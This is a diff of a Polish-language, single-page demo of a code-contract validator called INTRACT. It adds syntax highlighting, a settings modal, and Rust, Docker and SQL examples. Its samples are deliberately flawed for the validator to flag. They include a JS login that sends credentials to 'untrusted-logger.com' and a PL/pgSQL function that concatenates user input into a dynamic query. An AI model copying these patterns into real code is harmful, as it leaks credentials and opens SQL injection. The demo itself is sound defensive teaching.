@@ -9,6 +9,9 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
     
+    <!-- Ace Editor for Premium Syntax Highlighting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.min.js"></script>
+
     <style>
         :root {
             --bg-dark: #0a0b10;
@@ -491,32 +494,265 @@
             gap: 0.5rem;
         }
 
-        .explanation-card li {
-            font-size: 0.85rem;
-            color: var(--text-muted);
+        /* High-tech Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 5, 8, 0.9);
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active {
             display: flex;
-            align-items: flex-start;
+            opacity: 1;
+        }
+
+        .modal-content {
+            background: var(--panel-bg);
+            border: 1px solid rgba(157, 78, 221, 0.3);
+            box-shadow: 0 0 30px rgba(157, 78, 221, 0.2);
+            border-radius: 20px;
+            width: 95%;
+            max-width: 1100px;
+            height: 85vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            transform: scale(0.95);
+            transition: transform 0.3s ease;
+            backdrop-filter: blur(20px);
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: scale(1);
+        }
+
+        .modal-header {
+            padding: 1.2rem 1.5rem;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(10, 11, 16, 0.8);
+        }
+
+        .modal-header h3 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #fff;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: linear-gradient(135deg, var(--green), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .modal-close {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .modal-close:hover {
+            color: var(--red);
+        }
+
+        .modal-body {
+            flex: 1;
+            padding: 1.5rem;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        .pipeline-flow {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border-color);
+            padding: 1.2rem;
+            border-radius: 12px;
+            position: relative;
+        }
+
+        .flow-node {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            width: 130px;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .node-icon {
+            width: 48px;
+            height: 48px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1.5px solid var(--border-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            color: var(--text-muted);
+        }
+
+        .node-active .node-icon {
+            background: rgba(157, 78, 221, 0.15);
+            border-color: var(--primary);
+            color: #fff;
+            box-shadow: 0 0 15px var(--primary-glow);
+        }
+
+        .node-success .node-icon {
+            background: rgba(76, 201, 240, 0.15);
+            border-color: var(--green);
+            color: #fff;
+            box-shadow: 0 0 15px rgba(76, 201, 240, 0.4);
+        }
+
+        .flow-arrow {
+            flex: 1;
+            height: 2px;
+            background: var(--border-color);
+            position: relative;
+            z-index: 1;
+        }
+
+        .flow-arrow-active {
+            background: linear-gradient(to right, var(--primary), var(--green));
+            animation: flow-run 2s infinite linear;
+            background-size: 200% 100%;
+        }
+
+        @keyframes flow-run {
+            0% { background-position: 100% 0; }
+            100% { background-position: 0 0; }
+        }
+
+        .payload-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            flex: 1;
+            min-height: 380px;
+        }
+
+        .payload-box {
+            display: flex;
+            flex-direction: column;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            overflow: hidden;
+            background: #050508;
+        }
+
+        .payload-title {
+            background: rgba(255, 255, 255, 0.02);
+            padding: 0.6rem 1rem;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #fff;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* High-tech Settings Modal Styles */
+        .settings-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.2rem;
+        }
+
+        .settings-field {
+            display: flex;
+            flex-direction: column;
             gap: 0.5rem;
         }
 
-        .explanation-card li::before {
-            content: "✦";
-            color: var(--primary);
+        .settings-field label {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .settings-field input, .settings-field select {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-color);
+            padding: 0.6rem 0.8rem;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 0.9rem;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .settings-field input:focus, .settings-field select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 8px var(--primary-glow);
+        }
+
+        .btn-settings {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            color: var(--text-muted);
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+            transition: all 0.2s ease;
+        }
+
+        .btn-settings:hover {
+            background: rgba(157, 78, 221, 0.15);
+            border-color: var(--primary);
+            color: #fff;
         }
     </style>
 </head>
 <body>
 
     <!-- Header -->
-    <header>
-        <div class="logo-container">
-            <div class="logo-icon">I</div>
-            <div class="logo-title">INTRACT</div>
-            <span class="badge-version">v0.5.8</span>
+    <header style="display: flex; justify-content: space-between; align-items: center;">
+        <div style="display: flex; align-items: center; gap: 1.5rem;">
+            <div class="logo-container">
+                <div class="logo-icon">I</div>
+                <div class="logo-title">INTRACT</div>
+                <span class="badge-version">v0.5.8</span>
+            </div>
+            <div style="font-size: 0.9rem; color: var(--text-muted); display: inline-block;">
+                Interactive Intent-Contract Verification
+            </div>
         </div>
-        <div style="font-size: 0.9rem; color: var(--text-muted);">
-            Interactive Intent-Contract Verification
-        </div>
+        <button class="btn-settings" onclick="openLlmSettings()">
+            ⚙️ Konfiguracja LLM
+        </button>
     </header>
 
     <!-- Main Container -->
@@ -537,6 +773,18 @@
                 <button class="example-btn" id="ex-js-network" onclick="selectExample('js')">
                     <span class="example-name">3. JS: Naruszenie sieci</span>
                     <span class="example-desc">Funkcja pomocnicza próbuje nawiązać połączenie sieciowe mimo zakazu.</span>
+                </button>
+                <button class="example-btn" id="ex-rust-unsafe" onclick="selectExample('rust')">
+                    <span class="example-name">4. Rust: Safe Code Guard</span>
+                    <span class="example-desc">Polityka zabrania unsafe w module dekodera (forbid:unsafe).</span>
+                </button>
+                <button class="example-btn" id="ex-docker-root" onclick="selectExample('docker')">
+                    <span class="example-name">5. Docker: Non-root User</span>
+                    <span class="example-desc">Kontrakt zabrania uruchamiania kontenera z prawami roota (forbid:root).</span>
+                </button>
+                <button class="example-btn" id="ex-sql-injection" onclick="selectExample('sql')">
+                    <span class="example-name">6. SQL: Raw Interpolation Guard</span>
+                    <span class="example-desc">Polityka zabrania bezpośredniej konkatenacji w zapytaniach SQL (forbid:raw_sql).</span>
                 </button>
             </div>
 
@@ -569,20 +817,25 @@
                     intract.toon.yaml (YAML)
                 </button>
             </div>
-            <div class="editor-body">
-                <textarea class="code-textarea" id="editor-textarea" spellcheck="false"></textarea>
+            <div class="editor-body" style="flex: 1; display: flex; flex-direction: column; min-height: 450px;">
+                <div id="editor-textarea" style="flex: 1; font-family: 'Fira Code', monospace; font-size: 0.95rem;"></div>
             </div>
         </div>
 
         <!-- Output & Results Panel -->
         <div class="results-panel">
-            <div class="action-bar">
-                <button class="btn-run" onclick="runValidation()">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
-                    Uruchom Walidację Engine
-                </button>
-                <button class="btn-reset" onclick="resetActiveExample()" title="Resetuj przykład do stanu bazowego">
-                    ↺
+            <div class="action-bar" style="display: flex; flex-direction: column; gap: 0.75rem;">
+                <div style="display: flex; gap: 0.5rem; width: 100%;">
+                    <button class="btn-run" onclick="runValidation()" style="flex: 1;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+                        Uruchom Walidację Engine
+                    </button>
+                    <button class="btn-reset" onclick="resetActiveExample()" title="Resetuj przykład do stanu bazowego">
+                        ↺
+                    </button>
+                </div>
+                <button class="btn-run" onclick="showLlmDiagnostics()" style="background: linear-gradient(135deg, var(--green), var(--primary)); box-shadow: 0 4px 15px rgba(76, 201, 240, 0.4); font-size: 0.95rem; padding: 0.8rem;">
+                    🤖 Pokaż przepływ LLM & Cache Miss
                 </button>
             </div>
 
@@ -640,32 +893,73 @@
         const examples = {
             python: {
                 ext: "py",
-                src: `# calc.py - Kalkulator numeryczny\n\ndef add(a, b):\n    # TODO: Log activity\n    with open("log.txt", "a") as f:\n        f.write(f"Add called with {a} and {b}\\n")\n    return a + b\n\ndef divide(a, b):\n    if b == 0:\n        raise ValueError("Cannot divide by zero")\n    return a / b`,
+                src: `# calc.py - Kalkulator numeryczny\n\n# @intract.v1 id:pure-addition intent:pure:add forbid:write\ndef add(a, b):\n    # TODO: Log activity\n    with open("log.txt", "a") as f:\n        f.write(f"Add called with {a} and {b}\\n")\n    return a + b\n\n# @intract.v1 id:div-check intent:safe:div\ndef divide(a, b):\n    if b == 0:\n        raise ValueError("Cannot divide by zero")\n    return a / b`,
                 toon: `intract://src/calc.py?func=add#id=pure-addition&intent=pure-add&forbid=write\nintract://src/calc.py?func=divide#id=div-check&intent=safe-div`,
                 yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: pure-addition\n    intent: pure:add\n    forbid:\n      - write\n    target:\n      file: src/calc.py\n      function: add\n\n  - id: div-check\n    intent: safe:div\n    target:\n      file: src/calc.py\n      function: divide`
             },
             html: {
                 ext: "html",
-                src: `<!-- index.html -->\n<!DOCTYPE html>\n<html>\n<body>\n    <div id="app">\n        <h1>Panel transakcji</h1>\n        <button id="btn-add">Dodaj środki</button>\n        <button id="btn-withdraw" class="auth-required">Wypłać środki</button>\n    </div>\n</body>\n</html>`,
+                src: `<!-- index.html -->\n<!DOCTYPE html>\n<html>\n<body>\n    <div id="app">\n        <h1>Panel transakcji</h1>\n        <!-- @intract.v1 id:dom-button-check intent:click:btn req:auth xpath://button[@id='btn-add'] -->\n        <button id="btn-add">Dodaj środki</button>\n        <button id="btn-withdraw" class="auth-required">Wypłać środki</button>\n    </div>\n</body>\n</html>`,
                 toon: `intract://src/index.html?xpath=//button[@id="btn-add"]#id=dom-button-check&intent=click-btn&req=auth`,
                 yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: dom-button-check\n    intent: click:btn\n    require:\n      - auth\n    target:\n      file: src/index.html\n      xpath: //button[@id="btn-add"]`
             },
             js: {
                 ext: "js",
-                src: `// auth.js - Uwierzytelnianie\n\nfunction login(username, password) {\n    // Sprawdzanie lokalne\n    if (username === "admin" && password === "secret") {\n        // Naruszenie: wysyłanie danych logowania przez HTTP do loggera\n        const xhr = new XMLHttpRequest();\n        xhr.open("POST", "http://untrusted-logger.com/log", false);\n        xhr.send(username);\n        return { success: true };\n    }\n    return { success: false };\n}`,
+                src: `// auth.js - Uwierzytelnianie\n\n// @intract.v1 id:auth-login intent:perform:login forbid:network\nfunction login(username, password) {\n    // Sprawdzanie lokalne\n    if (username === "admin" && password === "secret") {\n        // Naruszenie: wysyłanie danych logowania przez HTTP do loggera\n        const xhr = new XMLHttpRequest();\n        xhr.open("POST", "http://untrusted-logger.com/log", false);\n        xhr.send(username);\n        return { success: true };\n    }\n    return { success: false };\n}`,
                 toon: `intract://src/auth.js?func=login#id=auth-login&intent=perform-login&forbid=network`,
                 yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: auth-login\n    intent: perform:login\n    forbid:\n      - network\n    target:\n      file: src/auth.js\n      function: login`
+            },
+            rust: {
+                ext: "rs",
+                src: `// decoder.rs - Safe Packet Decoder\n\n// @intract.v1 id:safe-decoder intent:decode:raw forbid:unsafe\npub fn decode_header(raw_data: &[u8]) -> Header {\n    // Naruszenie: bezpośrednie rzutowanie pamięci za pomocą unsafe transmute\n    unsafe {\n        let header: Header = std::mem::transmute(*raw_data.as_ptr());\n        header\n    }\n}`,
+                toon: `intract://src/decoder.rs?func=decode_header#id=safe-decoder&intent=decode-raw&forbid=unsafe`,
+                yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: safe-decoder\n    intent: decode:raw\n    forbid:\n      - unsafe\n    target:\n      file: src/decoder.rs\n      function: decode_header`
+            },
+            docker: {
+                ext: "dockerfile",
+                src: `# Dockerfile - Wdrożenie produkcyjne\n\n# @intract.v1 id:non-root-container intent:deploy:container forbid:root_user\nFROM node:18-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm install\nCOPY . .\n\n# BŁĄD: Brak deklaracji "USER node" - kontener uruchomi się z prawami roota!\nCMD ["npm", "start"]`,
+                toon: `intract://Dockerfile#id=non-root-container&intent=deploy-container&forbid=root_user`,
+                yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: non-root-container\n    intent: deploy:container\n    forbid:\n      - root_user\n    target:\n      file: Dockerfile`
+            },
+            sql: {
+                ext: "sql",
+                src: `-- query.sql - Logika wyszukiwania użytkowników\n\n-- @intract.v1 id:sql-injection-guard intent:query:users forbid:raw_sql\nCREATE OR REPLACE FUNCTION find_user(user_input TEXT) RETURNS TABLE(id INT, name TEXT) AS $$\nBEGIN\n    -- Naruszenie: dynamiczne zapytanie SQL ze wstrzykiwaniem stringów!\n    RETURN QUERY EXECUTE 'SELECT id, name FROM users WHERE name = \\' || user_input || '\\'';\nEND;\n$$ LANGUAGE plpgsql;`,
+                toon: `intract://src/query.sql#id=sql-injection-guard&intent=query-users&forbid=raw_sql`,
+                yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: sql-injection-guard\n    intent: query:users\n    forbid:\n      - raw_sql\n    target:\n      file: src/query.sql`
             }
         };
 
         let currentExample = 'python';
         let currentTab = 'src';
+        let editor;
 
         // Editor state storage to preserve changes made by user
         let userEdits = JSON.parse(JSON.stringify(examples));
 
         function init() {
+            // Initialize Ace Editor
+            editor = ace.edit("editor-textarea");
+            editor.setTheme("ace/theme/chaos");
+            editor.setShowPrintMargin(false);
+            
+            // Listen to edits to save state
+            editor.on("change", () => {
+                userEdits[currentExample][currentTab] = editor.getValue();
+            });
+
             selectExample('python');
+        }
+
+        function getModeForTab(tab, ext) {
+            if (tab === 'toon') return 'ace/mode/text';
+            if (tab === 'yaml') return 'ace/mode/yaml';
+            if (ext === 'py') return 'ace/mode/python';
+            if (ext === 'html') return 'ace/mode/html';
+            if (ext === 'js') return 'ace/mode/javascript';
+            if (ext === 'rs') return 'ace/mode/rust';
+            if (ext === 'dockerfile') return 'ace/mode/dockerfile';
+            if (ext === 'sql') return 'ace/mode/sql';
+            return 'ace/mode/text';
         }
 
         function selectExample(name) {
@@ -676,18 +970,21 @@
             if(name === 'python') document.getElementById('ex-pure-python').classList.add('active');
             if(name === 'html') document.getElementById('ex-dom-html').classList.add('active');
             if(name === 'js') document.getElementById('ex-js-network').classList.add('active');
+            if(name === 'rust') document.getElementById('ex-rust-unsafe').classList.add('active');
+            if(name === 'docker') document.getElementById('ex-docker-root').classList.add('active');
+            if(name === 'sql') document.getElementById('ex-sql-injection').classList.add('active');
 
             // Update editor tabs extension
             document.getElementById('editor-ext').innerText = userEdits[name].ext;
 
-            // Load content to editor
+            // Load content to editor session
             updateEditorContent();
 
             // Clear console and validation table
             const consoleBox = document.getElementById('console-output');
             consoleBox.innerHTML = `
                 <div class="console-line console-info">Kompilowanie AST projektu dla przykładu '${name}'... Gotowy.</div>
-                <div class="console-line">Czekam na uruchomienie walidacji...</div>
+                <div class="console-line">Czekam na uruchomowanie walidacji...</div>
             `;
             document.getElementById('results-tbody').innerHTML = `
                 <tr>
@@ -697,15 +994,10 @@
                 </tr>
             `;
             
-            // Update simulated coverage value
             updateCoverage();
         }
 
         function selectTab(tab) {
-            // Save current editor value before switching
-            const textarea = document.getElementById('editor-textarea');
-            userEdits[currentExample][currentTab] = textarea.value;
-
             currentTab = tab;
             document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
             document.getElementById(`tab-${tab}`).classList.add('active');
@@ -714,8 +1006,13 @@
         }
 
         function updateEditorContent() {
-            const textarea = document.getElementById('editor-textarea');
-            textarea.value = userEdits[currentExample][currentTab];
+            if (!editor) return;
+            const content = userEdits[currentExample][currentTab];
+            editor.setValue(content, -1);
+            
+            // Set correct mode
+            const mode = getModeForTab(currentTab, userEdits[currentExample].ext);
+            editor.getSession().setMode(mode);
         }
 
         function resetActiveExample() {
@@ -739,12 +1036,7 @@
             document.getElementById('coverage-progress').style.width = cov;
         }
 
-        // The Heart of the Simulator: Live Validator Engine
         function runValidation() {
-            // Save current changes first
-            const textarea = document.getElementById('editor-textarea');
-            userEdits[currentExample][currentTab] = textarea.value;
-
             const srcCode = userEdits[currentExample].src;
             const consoleBox = document.getElementById('console-output');
             
@@ -753,19 +1045,19 @@
             
             setTimeout(() => {
                 appendConsole(`Wczytywanie kodu źródłowego (typ: ${currentExample})...`, "info");
-            }, 200);
+            }, 150);
 
             setTimeout(() => {
-                appendConsole("Wczytywanie i parsowanie pliku manifestu toon...", "info");
-            }, 400);
+                appendConsole("Wczytywanie i parsowanie aktywnych manifestów toon...", "info");
+            }, 300);
 
             setTimeout(() => {
                 appendConsole("Rozpoczynanie statycznej analizy kodu i AST w poszukiwaniu efektów...", "warning");
-            }, 600);
+            }, 450);
 
             setTimeout(() => {
                 performLiveCheck(srcCode);
-            }, 900);
+            }, 700);
         }
 
         function appendConsole(text, type = "") {
@@ -777,118 +1069,712 @@
             consoleBox.scrollTop = consoleBox.scrollHeight;
         }
 
+        function parseToonUri(uriStr) {
+            try {
+                // Clean comment tokens and quotes
+                let cleanUri = uriStr.replace(/^[#\s\/<!--@\s]+/, "")
+                                     .replace(/["'-->\s]+$/, "")
+                                     .trim();
+                                     
+                if (cleanUri.startsWith("uri=")) {
+                    cleanUri = cleanUri.substring(4).replace(/^["']/, "").replace(/["']$/, "");
+                }
+                
+                const url = new URL(cleanUri);
+                const params = new URLSearchParams(url.search);
+                
+                const hash = url.hash.replace("#", "");
+                const hashParams = new URLSearchParams(hash);
+                
+                return {
+                    id: hashParams.get("id") || params.get("id") || "contract",
+                    intent: hashParams.get("intent") || params.get("intent") || "action:obj",
+                    forbid: hashParams.get("forbid") || params.get("forbid") || hashParams.get("forb") || params.get("forb"),
+                    req: hashParams.get("req") || params.get("req") || hashParams.get("require") || params.get("require") || hashParams.get("req"),
+                    file: url.pathname || "file",
+                    func: params.get("func") || params.get("function"),
+                    line: params.get("line"),
+                    xpath: params.get("xpath") || params.get("xpatch")
+                };
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function parseInlineContractPayload(payload, defaults = {}) {
+            const text = String(payload || '')
+                .replace(/-->/g, '')
+                .replace(/\*\//g, '')
+                .trim();
+            if (!text) return null;
+
+            const tokens = text.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) || [];
+            const out = {
+                id: defaults.id || 'contract',
+                intent: defaults.intent || 'action:obj',
+                forbid: defaults.forbid,
+                req: defaults.req,
+                file: defaults.file,
+                func: defaults.func,
+                line: defaults.line,
+                xpath: defaults.xpath,
+            };
+
+            for (const token of tokens) {
+                const match = token.match(/^([A-Za-z_][A-Za-z0-9_-]*)(:|=)(.+)$/);
+                if (!match) continue;
+
+                const key = match[1].toLowerCase();
+                const value = match[3].replace(/^['"]|['"]$/g, '').trim();
+                if (!value) continue;
+
+                if (key === 'id' || key === 'contract_id') out.id = value;
+                else if (key === 'intent') out.intent = value;
+                else if (key === 'forbid' || key === 'forbidden' || key === 'forb' || key === 'no') out.forbid = value;
+                else if (key === 'req' || key === 'require' || key === 'requires') out.req = value;
+                else if (key === 'file' || key === 'path' || key === 'target') out.file = value;
+                else if (key === 'func' || key === 'function') out.func = value;
+                else if (key === 'line') out.line = value;
+                else if (key === 'xpath' || key === 'xpatch') out.xpath = value;
+                else if (key === 'action') {
+                    const objectPart = out.intent.includes(':') ? out.intent.split(':').slice(1).join(':') : 'obj';
+                    out.intent = `${value}:${objectPart}`;
+                } else if (key === 'object' || key === 'obj') {
+                    const actionPart = out.intent.includes(':') ? out.intent.split(':')[0] : 'action';
+                    out.intent = `${actionPart}:${value}`;
+                }
+            }
+
+            return out;
+        }
+
+        function inferFunctionName(lines, lineIndex, exampleType) {
+            for (let i = lineIndex + 1; i < Math.min(lines.length, lineIndex + 20); i++) {
+                const text = lines[i].trim();
+                if (!text) continue;
+                if (exampleType === 'python') {
+                    const m = text.match(/^def\s+([A-Za-z_][A-Za-z0-9_]*)\s*\(/);
+                    if (m) return m[1];
+                } else if (exampleType === 'js') {
+                    const m = text.match(/^function\s+([A-Za-z_$][A-Za-z0-9_$]*)\s*\(/);
+                    if (m) return m[1];
+                } else if (exampleType === 'rust') {
+                    const m = text.match(/^(?:pub\s+)?fn\s+([A-Za-z_][A-Za-z0-9_]*)\s*\(/);
+                    if (m) return m[1];
+                } else if (exampleType === 'sql') {
+                    const m = text.match(/^(?:create\s+or\s+replace\s+)?function\s+([A-Za-z_][A-Za-z0-9_]*)\s*\(/i);
+                    if (m) return m[1];
+                }
+            }
+            return null;
+        }
+
+        function parseInlineContractsWithContext(src, exampleType) {
+            const lines = src.split('\n');
+            const contracts = [];
+            for (let index = 0; index < lines.length; index++) {
+                const line = lines[index];
+                const parsed = parseInlineOrUriContract(line, exampleType);
+                if (!parsed) continue;
+
+                const defaultTarget = defaultInlineTarget(exampleType);
+                const func = parsed.func || inferFunctionName(lines, index, exampleType);
+                contracts.push({
+                    ...parsed,
+                    file: parsed.file || defaultTarget.file,
+                    line: parsed.line || String(index + 1),
+                    func: func || parsed.func,
+                });
+            }
+            return contracts;
+        }
+
+        function contractToToonUri(contract) {
+            const file = contract.file || 'file';
+            const query = new URLSearchParams();
+            if (contract.func) query.set('func', contract.func);
+            if (contract.line) query.set('line', String(contract.line));
+            if (contract.xpath) query.set('xpath', contract.xpath);
+
+            const fragment = new URLSearchParams();
+            if (contract.id) fragment.set('id', contract.id);
+            if (contract.intent) fragment.set('intent', contract.intent);
+            if (contract.forbid) fragment.set('forbid', contract.forbid);
+            if (contract.req) fragment.set('req', contract.req);
+
+            const queryPart = query.toString();
+            const fragmentPart = fragment.toString();
+            return `intract://${file}${queryPart ? `?${queryPart}` : ''}${fragmentPart ? `#${fragmentPart}` : ''}`;
+        }
+
+        function contractsToToonText(contracts) {
+            return contracts.map(contractToToonUri).join('\n');
+        }
+
+        function contractsToYamlText(contracts) {
+            const lines = ['# Auto-generated from inline @intract.v1', 'version: intract.v1', 'contracts:'];
+            for (const c of contracts) {
+                lines.push(`  - id: ${c.id || 'contract'}`);
+                lines.push(`    intent: ${c.intent || 'action:obj'}`);
+                if (c.forbid) {
+                    lines.push('    forbid:');
+                    for (const item of String(c.forbid).split(',').map(x => x.trim()).filter(Boolean)) {
+                        lines.push(`      - ${item}`);
+                    }
+                }
+                if (c.req) {
+                    lines.push('    require:');
+                    for (const item of String(c.req).split(',').map(x => x.trim()).filter(Boolean)) {
+                        lines.push(`      - ${item}`);
+                    }
+                }
+                lines.push('    target:');
+                lines.push(`      file: ${c.file || 'file'}`);
+                if (c.func) lines.push(`      function: ${c.func}`);
+                if (c.xpath) lines.push(`      xpath: ${c.xpath}`);
+                if (c.line) lines.push(`      line: ${c.line}`);
+            }
+            return lines.join('\n');
+        }
+
+        function defaultInlineTarget(exampleType) {
+            if (exampleType === 'python') return { file: 'src/calc.py' };
+            if (exampleType === 'html') return { file: 'src/index.html' };
+            if (exampleType === 'js') return { file: 'src/auth.js' };
+            if (exampleType === 'rust') return { file: 'src/decoder.rs' };
+            if (exampleType === 'docker') return { file: 'Dockerfile' };
+            if (exampleType === 'sql') return { file: 'src/query.sql' };
+            return { file: 'file' };
+        }
+
+        function parseInlineOrUriContract(line, exampleType) {
+            if (line.includes('intract://')) {
+                const match = line.match(/(intract:\/\/[^\s"']+)/);
+                if (match) {
+                    return parseToonUri(match[1]);
+                }
+            }
+
+            const marker = line.includes('@intract.v1')
+                ? '@intract.v1'
+                : (line.includes('@intract') ? '@intract' : null);
+            if (!marker) return null;
+
+            const payload = line.split(marker, 2)[1]?.trim();
+            if (!payload) return null;
+
+            return parseInlineContractPayload(payload, defaultInlineTarget(exampleType));
+        }
+
         function performLiveCheck(src) {
             const tbody = document.getElementById('results-tbody');
             tbody.innerHTML = "";
 
-            if (currentExample === 'python') {
-                // Python pure function example checks
-                // Check if 'open(' is still in the code
-                const hasWrite = src.includes("open(") || src.includes(".write(");
+            let contracts = parseInlineContractsWithContext(src, currentExample);
+
+            // 1. Scan for inline Toon URI comments in source code
+            if (contracts.length > 0) {
+                userEdits[currentExample].toon = contractsToToonText(contracts);
+                userEdits[currentExample].yaml = contractsToYamlText(contracts);
+                appendConsole(`SYSTEM: Wygenerowano Toon/YAML z inline kontraktów (${contracts.length}) z kontekstu pliku i linii.`, "info");
+            }
+
+            // 2. Scan external manifest files if no inline contracts found
+            if (contracts.length === 0) {
+                const toonText = userEdits[currentExample].toon;
+                for (let line of toonText.split("\n")) {
+                    if (line.trim().includes("intract://")) {
+                        const match = line.match(/(intract:\/\/[^\s"']+)/);
+                        if (match) {
+                            const parsed = parseToonUri(match[1]);
+                            if (parsed) contracts.push(parsed);
+                        }
+                    }
+                }
+            }
+
+            // Fallback default contract if nothing matches
+            if (contracts.length === 0) {
+                if (currentExample === 'python') {
+                    contracts.push({ id: 'pure-addition', intent: 'pure:add', forbid: 'write', file: 'src/calc.py', func: 'add' });
+                } else if (currentExample === 'html') {
+                    contracts.push({ id: 'dom-button-check', intent: 'click:btn', req: 'auth', file: 'src/index.html', xpath: '//button[@id="btn-add"]' });
+                } else if (currentExample === 'js') {
+                    contracts.push({ id: 'auth-login', intent: 'perform:login', forbid: 'network', file: 'src/auth.js', func: 'login' });
+                } else if (currentExample === 'rust') {
+                    contracts.push({ id: 'safe-decoder', intent: 'decode:raw', forbid: 'unsafe', file: 'src/decoder.rs', func: 'decode_header' });
+                } else if (currentExample === 'docker') {
+                    contracts.push({ id: 'non-root-container', intent: 'deploy:container', forbid: 'root_user', file: 'Dockerfile' });
+                } else if (currentExample === 'sql') {
+                    contracts.push({ id: 'sql-injection-guard', intent: 'query:users', forbid: 'raw_sql', file: 'src/query.sql' });
+                }
+            }
+
+            let hasViolations = false;
+
+            for (let c of contracts) {
+                let status = "pass";
+                let detail = "Wszystkie zadeklarowane zasady są zachowane.";
+
+                if (currentExample === 'python') {
+                    const hasWrite = src.includes("open(") || src.includes(".write(");
+                    const hasNetwork = src.includes("requests") || src.includes("socket");
+
+                    if (c.forbid === 'write' && hasWrite) {
+                        status = "violation";
+                        detail = "Wykryto zabroniony efekt 'write' (operacje plikowe) w kalkulatorze!";
+                        hasViolations = true;
+                    } else if (c.forbid === 'network' && hasNetwork) {
+                        status = "violation";
+                        detail = "Wykryto zabroniony efekt 'network' w kodzie Python!";
+                        hasViolations = true;
+                    }
+                } 
+                else if (currentExample === 'html') {
+                    const hasBtnAddAuth = src.includes('id="btn-add" class="auth-required"') || 
+                                         src.includes('id="btn-add" data-auth') || 
+                                         src.includes('btn-add" class="auth') || 
+                                         src.includes('btn-add" data-auth="true"');
+                                         
+                    if (c.req === 'auth' && !hasBtnAddAuth) {
+                        status = "violation";
+                        detail = "Brak atrybutu autoryzacji 'auth' na przycisku dodawania środków!";
+                        hasViolations = true;
+                    }
+                }
+                else if (currentExample === 'js') {
+                    const hasNetwork = src.includes("XMLHttpRequest") || src.includes("fetch(") || src.includes("http");
+                    
+                    if (c.forbid === 'network' && hasNetwork) {
+                        status = "violation";
+                        detail = "Zabronione wywołanie sieciowe loggera XMLHttpRequest w metodzie logowania!";
+                        hasViolations = true;
+                    }
+                }
+                else if (currentExample === 'rust') {
+                    const hasUnsafe = src.includes("unsafe");
+                    
+                    if (c.forbid === 'unsafe' && hasUnsafe) {
+                        status = "violation";
+                        detail = "Wykryto zabronione użycie bloku 'unsafe' w module dekodera pakietów!";
+                        hasViolations = true;
+                    }
+                }
+                else if (currentExample === 'docker') {
+                    const hasUser = src.includes("USER");
+                    
+                    if (c.forbid === 'root_user' && !hasUser) {
+                        status = "violation";
+                        detail = "Brak instrukcji USER w pliku Dockerfile! Kontener uruchomi się jako root.";
+                        hasViolations = true;
+                    }
+                }
+                else if (currentExample === 'sql') {
+                    const hasConcat = src.includes("||") || src.includes("+") || src.includes("EXECUTE");
+                    
+                    if (c.forbid === 'raw_sql' && hasConcat) {
+                        status = "violation";
+                        detail = "Wykryto dynamiczne wykonywanie zapytań SQL z konkatenacją stringów!";
+                        hasViolations = true;
+                    }
+                }
+
+                const badgeClass = status === 'pass' ? 'status-pass' : 'status-violation';
